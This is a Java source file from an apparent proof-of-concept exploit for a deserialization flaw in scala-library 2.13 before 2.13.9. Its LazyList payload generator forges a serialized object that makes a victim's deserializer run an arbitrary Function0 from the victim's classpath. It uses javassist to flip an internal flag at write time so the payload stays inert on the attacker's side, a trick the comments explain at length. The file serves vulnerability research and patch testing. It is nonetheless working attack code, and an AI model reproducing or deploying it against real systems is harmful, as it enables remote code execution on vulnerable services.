package poc.cve.lazylist.payload;

import javassist.ClassPool;
import javassist.LoaderClassPath;
import javassist.CtClass;
import javassist.CtMethod;
import javassist.CtNewMethod;
import poc.cve.lazylist.util.ReflectionUtil;
import poc.cve.lazylist.util.SerdeUtil;
import scala.Function0;
import scala.collection.immutable.ArraySeq;

import java.util.function.Function;

/**
 * Implementation of PayloadGenerator which can execute arbitrary scala.Function0 implementation present in the
 * victim's classpath. Requires Function0 provider passed to constructor. Function0 providers might require optional
 * Object[] arguments. For default ones, see DefaultProviders.
 * Requires: scala-library 2.13.x before 2.13.9
 */
public class LazyList implements PayloadGenerator {
    private static final String LAZY_LIST_CLASSNAME = "scala.collection.immutable.LazyList";

    static {
        try {
            ClassPool classPool = ClassPool.getDefault();
            classPool.appendClassPath(new LoaderClassPath(LazyList.class.getClassLoader()));

            CtClass ctClass = classPool.getCtClass(LAZY_LIST_CLASSNAME);

            // Actually we don't want our malware code to be executed on our machine when we serialize our
            // forged payload. This is why we set state's bitmap$0 field to true before writing to
            // indicate that state was already evaluated and only right before writing we set this field back to false
            // to make victim's deserializer evaluate state and eventually call our malware Function0.
            // To achieve this result, we define writeObject on LazyList and set bitmap$0 to false there using
            // javassist
            // This extra code definition won't affect on victim's JVM in any way because it exists only in our JVM
            // and it only affects the way object is being serialized (change field value)
            String writeObjectSource =
                    "private void writeObject(java.io.ObjectOutputStream out) {" +
                            "this.bitmap$0 = false;" +
                            "out.defaultWriteObject();" +
                            "}";
            CtMethod ctMethod = CtNewMethod.make(writeObjectSource, ctClass);
            ctClass.addMethod(ctMethod);

            ctClass.toClass(ArraySeq.class);
        }
        catch (Exception e) {
            throw new RuntimeException(e);
        }
    }
    private final Function<Object[], Function0<Object>> function0Provider;

    public LazyList(Function<Object[], Function0<Object>> function0Provider) {
        this.function0Provider = function0Provider;
    }

    @Override
    public byte[] generatePayload(Object... args) {
        Function0<Object> function0 = function0Provider.apply(args);

        Object lazyList = createLazyList(function0);
        Object serializationProxy = ReflectionUtil.newInstance("scala.collection.immutable.LazyList$SerializationProxy",
                lazyList);

        return  SerdeUtil.serialize(serializationProxy);
    }

    public Object createLazyList(Function0<Object> function0) {

        Object lazyList = ReflectionUtil.newInstance(LAZY_LIST_CLASSNAME, new Class[] {Function0.class}, function0);

        Object emptyLazyListState = ReflectionUtil.getStaticField("scala.collection.immutable.LazyList$State$Empty$", "MODULE$");
        ReflectionUtil.setField(lazyList, "scala$collection$immutable$LazyList$$state", emptyLazyListState);
        ReflectionUtil.setField(lazyList, "scala$collection$immutable$LazyList$$stateEvaluated", true);
        ReflectionUtil.setField(lazyList, "bitmap$0", true);

        return lazyList;
    }
}
